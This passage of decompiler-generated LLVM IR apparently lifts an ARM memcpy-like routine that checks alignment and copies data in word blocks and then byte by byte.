  br i1 %v5_16bc4, label %bb140, label %dec_label_pc_16bc8

dec_label_pc_16bc8:                               ; preds = %bb
  %v1_16bc8 = urem i32 %v1_16bb0, 4
  store i32 %v1_16bc8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16bc8 = icmp eq i32 %v1_16bc8, 0
  store i1 %v2_16bc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16bc8, label %dec_label_pc_16bd0, label %dec_label_pc_16c7c

dec_label_pc_16bd0:                               ; preds = %dec_label_pc_16bc8
  %v1_16bd0 = urem i32 %v0_16bb0, 4
  store i32 %v1_16bd0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16bd0 = icmp eq i32 %v1_16bd0, 0
  store i1 %v2_16bd0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_16bb0 to i2
  br i1 %v2_16bd0, label %dec_label_pc_16bd8, label %dec_label_pc_16cac

dec_label_pc_16bd8:                               ; preds = %dec_label_pc_16bd0, %dec_label_pc_16ca4
  %v0_16bf093 = phi i32 [ %v1_16bb0, %dec_label_pc_16bd0 ], [ %v0_16dcc76, %dec_label_pc_16ca4 ]
  %v0_16bec92 = phi i32 [ %v0_16bb0, %dec_label_pc_16bd0 ], [ %v0_16ca4, %dec_label_pc_16ca4 ]
  %v0_16bd8 = phi i32 [ %v2_16bc0, %dec_label_pc_16bd0 ], [ %v2_16c9c, %dec_label_pc_16ca4 ]
  %v1_16bd8 = add i32 %v0_16bd8, -8
  store i32 %v1_16bd8, i32* %r2.global-to-local, align 4
  %v3_16bd8 = sub i32 7, %v0_16bd8
  %v4_16bd8 = and i32 %v3_16bd8, %v0_16bd8
  %v5_16bd8 = icmp slt i32 %v4_16bd8, 0
  store i1 %v5_16bd8, i1* %cpsr_v.global-to-local, align 1
  %v6_16bd8 = icmp slt i32 %v1_16bd8, 0
  store i1 %v6_16bd8, i1* %cpsr_n.global-to-local, align 1
  %v7_16bd8 = icmp eq i32 %v0_16bd8, 8
  store i1 %v7_16bd8, i1* %cpsr_z.global-to-local, align 1
  %v2_16bdc = xor i1 %v6_16bd8, %v5_16bd8
  br i1 %v2_16bdc, label %dec_label_pc_16c2c, label %dec_label_pc_16be0

dec_label_pc_16be0:                               ; preds = %dec_label_pc_16bd8
  %v1_16be0 = add i32 %v0_16bd8, -28
  store i32 %v1_16be0, i32* %r2.global-to-local, align 4
  %v3_16be0 = sub i32 27, %v0_16bd8
  %v4_16be0 = and i32 %v3_16be0, %v1_16bd8
  %v5_16be0 = icmp slt i32 %v4_16be0, 0
  store i1 %v5_16be0, i1* %cpsr_v.global-to-local, align 1
  %v6_16be0 = icmp slt i32 %v1_16be0, 0
  store i1 %v6_16be0, i1* %cpsr_n.global-to-local, align 1
  %v7_16be0 = icmp eq i32 %v1_16bd8, 20
  store i1 %v7_16be0, i1* %cpsr_z.global-to-local, align 1
  %v2_16be4 = xor i1 %v6_16be0, %v5_16be0
  br i1 %v2_16be4, label %dec_label_pc_16c18, label %dec_label_pc_16be8

dec_label_pc_16be8:                               ; preds = %dec_label_pc_16be0
  %v0_16be8 = load i32, i32* @r4, align 4
  store i32 %v0_16be8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16bec

dec_label_pc_16bec:                               ; preds = %dec_label_pc_16bec.dec_label_pc_16bec_crit_edge, %dec_label_pc_16be8
  %v0_16bf0 = phi i32 [ %v12_16bf8, %dec_label_pc_16bec.dec_label_pc_16bec_crit_edge ], [ %v0_16bf093, %dec_label_pc_16be8 ]
  %v0_16bec = phi i32 [ %v0_16bec.pre, %dec_label_pc_16bec.dec_label_pc_16bec_crit_edge ], [ %v0_16bec92, %dec_label_pc_16be8 ]
  %v1_16bec = inttoptr i32 %v0_16bec to i32*
  %v2_16bec = load i32, i32* %v1_16bec, align 4
  %v3_16bec = add i32 %v0_16bec, 4
  %v4_16bec = inttoptr i32 %v3_16bec to i32*
  %v5_16bec = load i32, i32* %v4_16bec, align 4
  store i32 %v5_16bec, i32* %r4.global-to-local, align 4
  %v6_16bec = add i32 %v0_16bec, 8
  %v7_16bec = inttoptr i32 %v6_16bec to i32*
  %v8_16bec = load i32, i32* %v7_16bec, align 4
  store i32 %v8_16bec, i32* %ip.global-to-local, align 4
  %v9_16bec = add i32 %v0_16bec, 12
  %v10_16bec = inttoptr i32 %v9_16bec to i32*
  %v11_16bec = load i32, i32* %v10_16bec, align 4
  store i32 %v11_16bec, i32* %lr.global-to-local, align 4
  %v12_16bec = add i32 %v0_16bec, 16
  store i32 %v12_16bec, i32* %r1.global-to-local, align 4
  %v1_16bf0 = inttoptr i32 %v0_16bf0 to i32*
  store i32 %v2_16bec, i32* %v1_16bf0, align 4
  %v3_16bf0 = add i32 %v0_16bf0, 4
  %v4_16bf0 = inttoptr i32 %v3_16bf0 to i32*
  %v5_16bf0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16bf0, i32* %v4_16bf0, align 4
  %v6_16bf0 = add i32 %v0_16bf0, 8
  %v7_16bf0 = inttoptr i32 %v6_16bf0 to i32*
  %v8_16bf0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_16bf0, i32* %v7_16bf0, align 4
  %v9_16bf0 = add i32 %v0_16bf0, 12
  %v10_16bf0 = inttoptr i32 %v9_16bf0 to i32*
  %v11_16bf0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16bf0, i32* %v10_16bf0, align 4
  %v12_16bf0 = add i32 %v0_16bf0, 16
  store i32 %v12_16bf0, i32* %r0.global-to-local, align 4
  %v0_16bf4 = load i32, i32* %r1.global-to-local, align 4
  %v1_16bf4 = inttoptr i32 %v0_16bf4 to i32*
  %v2_16bf4 = load i32, i32* %v1_16bf4, align 4
  store i32 %v2_16bf4, i32* @r3, align 4
  %v3_16bf4 = add i32 %v0_16bf4, 4
  %v4_16bf4 = inttoptr i32 %v3_16bf4 to i32*
  %v5_16bf4 = load i32, i32* %v4_16bf4, align 4
  store i32 %v5_16bf4, i32* %r4.global-to-local, align 4
  %v6_16bf4 = add i32 %v0_16bf4, 8
  %v7_16bf4 = inttoptr i32 %v6_16bf4 to i32*
  %v8_16bf4 = load i32, i32* %v7_16bf4, align 4
  store i32 %v8_16bf4, i32* @ip, align 4
  %v9_16bf4 = add i32 %v0_16bf4, 12
  %v10_16bf4 = inttoptr i32 %v9_16bf4 to i32*
  %v11_16bf4 = load i32, i32* %v10_16bf4, align 4
  store i32 %v11_16bf4, i32* %lr.global-to-local, align 4
  %v12_16bf4 = add i32 %v0_16bf4, 16
  store i32 %v12_16bf4, i32* %r1.global-to-local, align 4
  %v1_16bf8 = inttoptr i32 %v12_16bf0 to i32*
  store i32 %v2_16bf4, i32* %v1_16bf8, align 4
  %v3_16bf8 = add i32 %v0_16bf0, 20
  %v4_16bf8 = inttoptr i32 %v3_16bf8 to i32*
  %v5_16bf8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16bf8, i32* %v4_16bf8, align 4
  %v6_16bf8 = add i32 %v0_16bf0, 24
  %v7_16bf8 = inttoptr i32 %v6_16bf8 to i32*
  %v8_16bf8 = load i32, i32* @ip, align 4
  store i32 %v8_16bf8, i32* %v7_16bf8, align 4
  %v9_16bf8 = add i32 %v0_16bf0, 28
  %v10_16bf8 = inttoptr i32 %v9_16bf8 to i32*
  %v11_16bf8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16bf8, i32* %v10_16bf8, align 4
  %v12_16bf8 = add i32 %v0_16bf0, 32
  store i32 %v12_16bf8, i32* %r0.global-to-local, align 4
  %v0_16bfc = load i32, i32* %r2.global-to-local, align 4
  %v1_16bfc = add i32 %v0_16bfc, -32
  store i32 %v1_16bfc, i32* %r2.global-to-local, align 4
  %v3_16bfc = sub i32 31, %v0_16bfc
  %v4_16bfc = and i32 %v3_16bfc, %v0_16bfc
  %v5_16bfc = icmp slt i32 %v4_16bfc, 0
  %v6_16bfc = icmp slt i32 %v1_16bfc, 0
  %v2_16c00 = xor i1 %v6_16bfc, %v5_16bfc
  br i1 %v2_16c00, label %dec_label_pc_16c04, label %dec_label_pc_16bec.dec_label_pc_16bec_crit_edge

dec_label_pc_16bec.dec_label_pc_16bec_crit_edge:  ; preds = %dec_label_pc_16bec
  %v0_16bec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16bec

dec_label_pc_16c04:                               ; preds = %dec_label_pc_16bec
  %v1_16c04 = add i32 %v0_16bfc, -16
  %v3_16c04 = add i32 %v0_16bfc, 2147483616
  %v4_16c04 = and i32 %v1_16c04, %v3_16c04
  %v5_16c04 = icmp slt i32 %v4_16c04, 0
  store i1 %v5_16c04, i1* %cpsr_v.global-to-local, align 1
  %v6_16c04 = icmp slt i32 %v1_16c04, 0
  store i1 %v6_16c04, i1* %cpsr_n.global-to-local, align 1
  %v7_16c04 = icmp eq i32 %v1_16c04, 0
  store i1 %v7_16c04, i1* %cpsr_z.global-to-local, align 1
  %v2_16c08 = xor i1 %v6_16c04, %v5_16c04
  br i1 %v2_16c08, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_16c04
  %v3_16c08 = load i32, i32* %r1.global-to-local, align 4
  %v4_16c08 = inttoptr i32 %v3_16c08 to i32*
  %v5_16c08 = load i32, i32* %v4_16c08, align 4
  store i32 %v5_16c08, i32* @r3, align 4
  %v6_16c08 = add i32 %v3_16c08, 4
  %v7_16c08 = inttoptr i32 %v6_16c08 to i32*
  %v8_16c08 = load i32, i32* %v7_16c08, align 4
  store i32 %v8_16c08, i32* %r4.global-to-local, align 4
  %v9_16c08 = add i32 %v3_16c08, 8
  %v10_16c08 = inttoptr i32 %v9_16c08 to i32*
  %v11_16c08 = load i32, i32* %v10_16c08, align 4
  store i32 %v11_16c08, i32* @ip, align 4
  %v12_16c08 = add i32 %v3_16c08, 12
  %v13_16c08 = inttoptr i32 %v12_16c08 to i32*
  %v14_16c08 = load i32, i32* %v13_16c08, align 4
  store i32 %v14_16c08, i32* %lr.global-to-local, align 4
  %v15_16c08 = add i32 %v3_16c08, 16
  store i32 %v15_16c08, i32* %r1.global-to-local, align 4
  %v4_16c0c = inttoptr i32 %v12_16bf8 to i32*
  store i32 %v5_16c08, i32* %v4_16c0c, align 4
  %v6_16c0c = add i32 %v0_16bf0, 36
  %v7_16c0c = inttoptr i32 %v6_16c0c to i32*
  %v8_16c0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_16c0c, i32* %v7_16c0c, align 4
  %v9_16c0c = add i32 %v0_16bf0, 40
  %v10_16c0c = inttoptr i32 %v9_16c0c to i32*
  %v11_16c0c = load i32, i32* @ip, align 4
  store i32 %v11_16c0c, i32* %v10_16c0c, align 4
  %v12_16c0c = add i32 %v0_16bf0, 44
  %v13_16c0c = inttoptr i32 %v12_16c0c to i32*
  %v14_16c0c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_16c0c, i32* %v13_16c0c, align 4
  %v15_16c0c = add i32 %v0_16bf0, 48
  store i32 %v15_16c0c, i32* %r0.global-to-local, align 4
  %v3_16c10 = load i32, i32* %r2.global-to-local, align 4
  %v4_16c10 = add i32 %v3_16c10, -16
  store i32 %v4_16c10, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_16c04, %bb136
  %v3_16c20101110 = phi i32 [ %v15_16c0c, %bb136 ], [ %v12_16bf8, %dec_label_pc_16c04 ]
  %v0_16c18.pre = phi i32 [ %v4_16c10, %bb136 ], [ %v1_16bfc, %dec_label_pc_16c04 ]
  %v2_16c14 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16c14, i32* @r4, align 4
  br label %dec_label_pc_16c18

dec_label_pc_16c18:                               ; preds = %dec_label_pc_16be0, %bb137
  %v3_16c20100 = phi i32 [ %v0_16bf093, %dec_label_pc_16be0 ], [ %v3_16c20101110, %bb137 ]
  %v0_16c18 = phi i32 [ %v1_16be0, %dec_label_pc_16be0 ], [ %v0_16c18.pre, %bb137 ]
  %v1_16c18 = add i32 %v0_16c18, 20
  store i32 %v1_16c18, i32* %r2.global-to-local, align 4
  %v3_16c18 = sub i32 0, %v0_16c18
  %v4_16c18 = and i32 %v1_16c18, %v3_16c18
  %v5_16c18 = icmp slt i32 %v4_16c18, 0
  store i1 %v5_16c18, i1* %cpsr_v.global-to-local, align 1
  %v6_16c18 = icmp slt i32 %v1_16c18, 0
  store i1 %v6_16c18, i1* %cpsr_n.global-to-local, align 1
  %v7_16c18 = icmp eq i32 %v1_16c18, 0
  store i1 %v7_16c18, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16c1c

dec_label_pc_16c1c:                               ; preds = %.thread114, %dec_label_pc_16c18
  %v0_16c2c.pre157 = phi i32 [ %v0_16c2c.pre, %.thread114 ], [ %v1_16c18, %dec_label_pc_16c18 ]
  %v3_16c20 = phi i32 [ %v3_16c2098115, %.thread114 ], [ %v3_16c20100, %dec_label_pc_16c18 ]
  %v1_16c24 = phi i1 [ %v1_16c28, %.thread114 ], [ %v5_16c18, %dec_label_pc_16c18 ]
  %v0_16c24 = phi i1 [ %v0_16c28, %.thread114 ], [ %v6_16c18, %dec_label_pc_16c18 ]
  %v2_16c1c = xor i1 %v1_16c24, %v0_16c24
  br i1 %v2_16c1c, label %.thread114, label %bb138

bb138:                                            ; preds = %dec_label_pc_16c1c
  %v3_16c1c = load i32, i32* %r1.global-to-local, align 4
  %v4_16c1c = inttoptr i32 %v3_16c1c to i32*
  %v5_16c1c = load i32, i32* %v4_16c1c, align 4
  store i32 %v5_16c1c, i32* @r3, align 4
  %v6_16c1c = add i32 %v3_16c1c, 4
  %v7_16c1c = inttoptr i32 %v6_16c1c to i32*
  %v8_16c1c = load i32, i32* %v7_16c1c, align 4
  store i32 %v8_16c1c, i32* @ip, align 4
  %v9_16c1c = add i32 %v3_16c1c, 8
  %v10_16c1c = inttoptr i32 %v9_16c1c to i32*
  %v11_16c1c = load i32, i32* %v10_16c1c, align 4
  store i32 %v11_16c1c, i32* %lr.global-to-local, align 4
  %v12_16c1c = add i32 %v3_16c1c, 12
  store i32 %v12_16c1c, i32* %r1.global-to-local, align 4
  %v4_16c20 = inttoptr i32 %v3_16c20 to i32*
  store i32 %v5_16c1c, i32* %v4_16c20, align 4
  %v6_16c20 = add i32 %v3_16c20, 4
  %v7_16c20 = inttoptr i32 %v6_16c20 to i32*
  %v8_16c20 = load i32, i32* @ip, align 4
  store i32 %v8_16c20, i32* %v7_16c20, align 4
  %v9_16c20 = add i32 %v3_16c20, 8
  %v10_16c20 = inttoptr i32 %v9_16c20 to i32*
  %v11_16c20 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16c20, i32* %v10_16c20, align 4
  %v12_16c20 = add i32 %v3_16c20, 12
  store i32 %v12_16c20, i32* %r0.global-to-local, align 4
  %v3_16c24 = load i32, i32* %r2.global-to-local, align 4
  %v4_16c24 = add i32 %v3_16c24, -12
  store i32 %v4_16c24, i32* %r2.global-to-local, align 4
  %v6_16c24 = sub i32 11, %v3_16c24
  %v7_16c24 = and i32 %v6_16c24, %v3_16c24
  %v8_16c24 = icmp slt i32 %v7_16c24, 0
  store i1 %v8_16c24, i1* %cpsr_v.global-to-local, align 1
  %v9_16c24 = icmp slt i32 %v4_16c24, 0
  store i1 %v9_16c24, i1* %cpsr_n.global-to-local, align 1
  %v10_16c24 = icmp eq i32 %v3_16c24, 12
  store i1 %v10_16c24, i1* %cpsr_z.global-to-local, align 1
  br label %.thread114

.thread114:                                       ; preds = %dec_label_pc_16c1c, %bb138
  %v0_16c2c.pre = phi i32 [ %v4_16c24, %bb138 ], [ %v0_16c2c.pre157, %dec_label_pc_16c1c ]
  %v3_16c2098115 = phi i32 [ %v12_16c20, %bb138 ], [ %v3_16c20, %dec_label_pc_16c1c ]
  %v1_16c28 = phi i1 [ %v8_16c24, %bb138 ], [ %v1_16c24, %dec_label_pc_16c1c ]
  %v0_16c28 = phi i1 [ %v9_16c24, %bb138 ], [ %v0_16c24, %dec_label_pc_16c1c ]
  %v2_16c28 = xor i1 %v1_16c28, %v0_16c28
  br i1 %v2_16c28, label %dec_label_pc_16c2c, label %dec_label_pc_16c1c

dec_label_pc_16c2c:                               ; preds = %.thread114, %dec_label_pc_16bd8
  %v4_16c3c = phi i32 [ %v0_16bf093, %dec_label_pc_16bd8 ], [ %v3_16c2098115, %.thread114 ]
  %v0_16c2c = phi i32 [ %v1_16bd8, %dec_label_pc_16bd8 ], [ %v0_16c2c.pre, %.thread114 ]
  %v1_16c2c = add i32 %v0_16c2c, 8
  store i32 %v1_16c2c, i32* %r2.global-to-local, align 4
  %v3_16c2c = sub i32 0, %v0_16c2c
  %v4_16c2c = and i32 %v1_16c2c, %v3_16c2c
  %v5_16c2c = icmp slt i32 %v4_16c2c, 0
  store i1 %v5_16c2c, i1* %cpsr_v.global-to-local, align 1
  %v6_16c2c = icmp slt i32 %v1_16c2c, 0
  store i1 %v6_16c2c, i1* %cpsr_n.global-to-local, align 1
  %v7_16c2c = icmp eq i32 %v1_16c2c, 0
  store i1 %v7_16c2c, i1* %cpsr_z.global-to-local, align 1
  %v2_16c30 = xor i1 %v6_16c2c, %v5_16c2c
  br i1 %v2_16c30, label %bb140, label %dec_label_pc_16c34

dec_label_pc_16c34:                               ; preds = %dec_label_pc_16c2c
  %v1_16c34 = add i32 %v0_16c2c, 4
  store i32 %v1_16c34, i32* %r2.global-to-local, align 4
  %v3_16c34 = sub i32 -5, %v0_16c2c
  %v4_16c34 = and i32 %v3_16c34, %v1_16c2c
  %v5_16c34 = icmp slt i32 %v4_16c34, 0
  store i1 %v5_16c34, i1* %cpsr_v.global-to-local, align 1
  %v6_16c34 = icmp slt i32 %v1_16c34, 0
  store i1 %v6_16c34, i1* %cpsr_n.global-to-local, align 1
  %v7_16c34 = icmp eq i32 %v1_16c2c, 4
  store i1 %v7_16c34, i1* %cpsr_z.global-to-local, align 1
  %v2_16c38 = xor i1 %v6_16c34, %v5_16c34
  %v3_16c38 = load i32, i32* %r1.global-to-local, align 4
  %v4_16c38 = inttoptr i32 %v3_16c38 to i32*
  %v5_16c38 = load i32, i32* %v4_16c38, align 4
  store i32 %v5_16c38, i32* @r3, align 4
  %v7_16c38 = add i32 %v3_16c38, 4
  br i1 %v2_16c38, label %.thread121, label %bb139

.thread121:                                       ; preds = %dec_label_pc_16c34
  store i32 %v7_16c38, i32* %r1.global-to-local, align 4
  %v5_16c3c = inttoptr i32 %v4_16c3c to i32*
  store i32 %v5_16c38, i32* %v5_16c3c, align 4
  %v6_16c3c = load i32, i32* %r0.global-to-local, align 4
  %v7_16c3c = add i32 %v6_16c3c, 4
  store i32 %v7_16c3c, i32* %r0.global-to-local, align 4
  %v0_16c4c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_16c34
  %v7_16c40 = inttoptr i32 %v7_16c38 to i32*
  %v8_16c40 = load i32, i32* %v7_16c40, align 4
  store i32 %v8_16c40, i32* @ip, align 4
  %v9_16c40 = add i32 %v3_16c38, 8
  store i32 %v9_16c40, i32* %r1.global-to-local, align 4
  %v4_16c44 = inttoptr i32 %v4_16c3c to i32*
  store i32 %v5_16c38, i32* %v4_16c44, align 4
  %v6_16c44 = add i32 %v4_16c3c, 4
  %v7_16c44 = inttoptr i32 %v6_16c44 to i32*
  %v8_16c44 = load i32, i32* @ip, align 4
  store i32 %v8_16c44, i32* %v7_16c44, align 4
  %v9_16c44 = add i32 %v4_16c3c, 8
  store i32 %v9_16c44, i32* %r0.global-to-local, align 4
  %v3_16c48 = load i32, i32* %r2.global-to-local, align 4
  %v4_16c48 = add i32 %v3_16c48, -4
  store i32 %v4_16c48, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread121, %.thread127, %dec_label_pc_16c2c, %bb, %dec_label_pc_16dfc, %dec_label_pc_16d90, %dec_label_pc_16d24, %bb139
  %v0_16c4c = phi i32 [ %v0_16c4c.pre, %.thread121 ], [ %v2_16c9c, %.thread127 ], [ %v1_16c2c, %dec_label_pc_16c2c ], [ %v2_16bc0, %bb ], [ %v0_16c4c60, %dec_label_pc_16dfc ], [ %v0_16c4c59, %dec_label_pc_16d90 ], [ %v0_16c4c58, %dec_label_pc_16d24 ], [ %v4_16c48, %bb139 ]
  %v1_16c4c = add i32 %v0_16c4c, 4
  store i32 %v1_16c4c, i32* %r2.global-to-local, align 4
  %v3_16c4c = sub i32 0, %v0_16c4c
  %v4_16c4c = and i32 %v1_16c4c, %v3_16c4c
  %v5_16c4c = icmp slt i32 %v4_16c4c, 0
  store i1 %v5_16c4c, i1* %cpsr_v.global-to-local, align 1
  %v6_16c4c = icmp slt i32 %v1_16c4c, 0
  store i1 %v6_16c4c, i1* %cpsr_n.global-to-local, align 1
  %v7_16c4c = icmp eq i32 %v1_16c4c, 0
  store i1 %v7_16c4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16c4c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_16c54.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_16c50 = load i8*, i8** %stack_var_-8, align 4
  %v4_16c50 = ptrtoint i8* %v3_16c50 to i32
  store i32 %v4_16c50, i32* %r0.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_16c54 = phi i32 [ %v0_16c54.pre, %bb140.bb142_crit_edge ], [ %v8_16bbc, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_16c4c, i32 %v0_16c54)
  %v0_16c58 = load i32, i32* %r2.global-to-local, align 4
  %v1_16c58 = add i32 %v0_16c58, -2
  %v3_16c58 = sub i32 1, %v0_16c58
  %v4_16c58 = and i32 %v3_16c58, %v0_16c58
  %v5_16c58 = icmp slt i32 %v4_16c58, 0
  store i1 %v5_16c58, i1* %cpsr_v.global-to-local, align 1
  %v6_16c58 = icmp slt i32 %v1_16c58, 0
  store i1 %v6_16c58, i1* %cpsr_n.global-to-local, align 1
  %v7_16c58 = icmp eq i32 %v0_16c58, 2
  store i1 %v7_16c58, i1* %cpsr_z.global-to-local, align 1
  %v0_16c5c = load i32, i32* %r1.global-to-local, align 4
  %v1_16c5c = inttoptr i32 %v0_16c5c to i8*
  %v2_16c5c = load i8, i8* %v1_16c5c, align 1
  %v5_16c5c = add i32 %v0_16c5c, 1
  store i32 %v5_16c5c, i32* %r1.global-to-local, align 4
  %v2_16c60 = load i32, i32* %r0.global-to-local, align 4
  %v3_16c60 = inttoptr i32 %v2_16c60 to i8*
  store i8 %v2_16c5c, i8* %v3_16c60, align 1
  %v4_16c60 = load i32, i32* %r0.global-to-local, align 4
  %v5_16c60 = add i32 %v4_16c60, 1
  store i32 %v5_16c60, i32* %r0.global-to-local, align 4
  %v0_16c64 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16c64 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16c64 = xor i1 %v0_16c64, %v1_16c64
  br i1 %v2_16c64, label %.thread124, label %bb143

bb143:                                            ; preds = %bb142
  %v3_16c64 = load i32, i32* %r1.global-to-local, align 4
  %v4_16c64 = inttoptr i32 %v3_16c64 to i8*
  %v5_16c64 = load i8, i8* %v4_16c64, align 1
  %v8_16c64 = add i32 %v3_16c64, 1
  store i32 %v8_16c64, i32* %r1.global-to-local, align 4
  %v6_16c68 = inttoptr i32 %v5_16c60 to i8*
  store i8 %v5_16c64, i8* %v6_16c68, align 1
  %v7_16c68 = load i32, i32* %r0.global-to-local, align 4
  %v8_16c68 = add i32 %v7_16c68, 1
  store i32 %v8_16c68, i32* %r0.global-to-local, align 4
  %v1_16c6c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16c6c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread124

.thread124:                                       ; preds = %bb142, %bb143
  %v7_16c70 = phi i32 [ %v8_16c68, %bb143 ], [ %v5_16c60, %bb142 ]
  %v2_16c70 = phi i1 [ %v2_16c6c.pre, %bb143 ], [ %v1_16c64, %bb142 ]
  %v1_16c70 = phi i1 [ %v1_16c6c.pre, %bb143 ], [ %v0_16c64, %bb142 ]
  %v0_16c6c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16c6c = xor i1 %v2_16c70, %v1_16c70
  %v4_16c6c = or i1 %v0_16c6c, %v3_16c6c
  br i1 %v4_16c6c, label %.thread125, label %bb144

bb144:                                            ; preds = %.thread124
  %v5_16c6c = load i32, i32* %r1.global-to-local, align 4
  %v6_16c6c = inttoptr i32 %v5_16c6c to i8*
  %v7_16c6c = load i8, i8* %v6_16c6c, align 1
  %v10_16c6c = add i32 %v5_16c6c, 1
  store i32 %v10_16c6c, i32* %r1.global-to-local, align 4
  %v8_16c70 = inttoptr i32 %v7_16c70 to i8*
  store i8 %v7_16c6c, i8* %v8_16c70, align 1
  %v9_16c70 = load i32, i32* %r0.global-to-local, align 4
  %v10_16c70 = add i32 %v9_16c70, 1
  store i32 %v10_16c70, i32* %r0.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb144
  %v2_16c74 = load i8*, i8** %stack_var_-8, align 4
  %v3_16c74 = ptrtoint i8* %v2_16c74 to i32
  store i32 %v3_16c74, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_16bbc)
  %v0_16c7c.pre = load i32, i32* @ip, align 4
  %v0_16c84.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_16c88.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16c7c

dec_label_pc_16c7c:                               ; preds = %dec_label_pc_16bc8, %.thread125
  %v2_16c88 = phi i32 [ %v1_16bb0, %dec_label_pc_16bc8 ], [ %v2_16c88.pre, %.thread125 ]
  %v0_16c84 = phi i32 [ %v0_16bb0, %dec_label_pc_16bc8 ], [ %v0_16c84.pre, %.thread125 ]
  %v0_16c7c = phi i32 [ %v1_16bc8, %dec_label_pc_16bc8 ], [ %v0_16c7c.pre, %.thread125 ]
  %v1_16c7c = sub i32 4, %v0_16c7c
  store i32 %v1_16c7c, i32* @ip, align 4
  %v1_16c80 = add i32 %v1_16c7c, -2
  %v3_16c80 = sub i32 1, %v1_16c7c
  %v4_16c80 = and i32 %v3_16c80, %v1_16c7c
  %v5_16c80 = icmp slt i32 %v4_16c80, 0
  store i1 %v5_16c80, i1* %cpsr_v.global-to-local, align 1
  %v6_16c80 = icmp slt i32 %v1_16c80, 0
  store i1 %v6_16c80, i1* %cpsr_n.global-to-local, align 1
  %v7_16c80 = icmp eq i32 %v1_16c7c, 2
  store i1 %v7_16c80, i1* %cpsr_z.global-to-local, align 1
  %v1_16c84 = inttoptr i32 %v0_16c84 to i8*
  %v2_16c84 = load i8, i8* %v1_16c84, align 1
  %v3_16c84 = zext i8 %v2_16c84 to i32
  store i32 %v3_16c84, i32* @r3, align 4
  %v5_16c84 = add i32 %v0_16c84, 1
  store i32 %v5_16c84, i32* %r1.global-to-local, align 4
  %v3_16c88 = inttoptr i32 %v2_16c88 to i8*
  store i8 %v2_16c84, i8* %v3_16c88, align 1
  %v4_16c88 = load i32, i32* %r0.global-to-local, align 4
  %v5_16c88 = add i32 %v4_16c88, 1
  store i32 %v5_16c88, i32* %r0.global-to-local, align 4
  %v0_16c8c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16c8c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16c8c = xor i1 %v0_16c8c, %v1_16c8c
  br i1 %v2_16c8c, label %.thread126, label %bb145

bb145:                                            ; preds = %dec_label_pc_16c7c
  %v3_16c8c = load i32, i32* %r1.global-to-local, align 4
  %v4_16c8c = inttoptr i32 %v3_16c8c to i8*
  %v5_16c8c = load i8, i8* %v4_16c8c, align 1
  %v6_16c8c = zext i8 %v5_16c8c to i32
  store i32 %v6_16c8c, i32* @r3, align 4
  %v8_16c8c = add i32 %v3_16c8c, 1
  store i32 %v8_16c8c, i32* %r1.global-to-local, align 4
  %v6_16c90 = inttoptr i32 %v5_16c88 to i8*
  store i8 %v5_16c8c, i8* %v6_16c90, align 1
  %v7_16c90 = load i32, i32* %r0.global-to-local, align 4
  %v8_16c90 = add i32 %v7_16c90, 1
  store i32 %v8_16c90, i32* %r0.global-to-local, align 4
  %v1_16c94.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16c94.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread126

.thread126:                                       ; preds = %dec_label_pc_16c7c, %bb145
  %v7_16c98 = phi i32 [ %v8_16c90, %bb145 ], [ %v5_16c88, %dec_label_pc_16c7c ]
  %v2_16c98 = phi i1 [ %v2_16c94.pre, %bb145 ], [ %v1_16c8c, %dec_label_pc_16c7c ]
  %v1_16c98 = phi i1 [ %v1_16c94.pre, %bb145 ], [ %v0_16c8c, %dec_label_pc_16c7c ]
  %v0_16c94 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16c94 = xor i1 %v2_16c98, %v1_16c98
  %v4_16c94 = or i1 %v0_16c94, %v3_16c94
  br i1 %v4_16c94, label %.thread127, label %bb146

bb146:                                            ; preds = %.thread126
  %v5_16c94 = load i32, i32* %r1.global-to-local, align 4
  %v6_16c94 = inttoptr i32 %v5_16c94 to i8*
  %v7_16c94 = load i8, i8* %v6_16c94, align 1
  %v8_16c94 = zext i8 %v7_16c94 to i32
  store i32 %v8_16c94, i32* @r3, align 4
  %v10_16c94 = add i32 %v5_16c94, 1
  store i32 %v10_16c94, i32* %r1.global-to-local, align 4
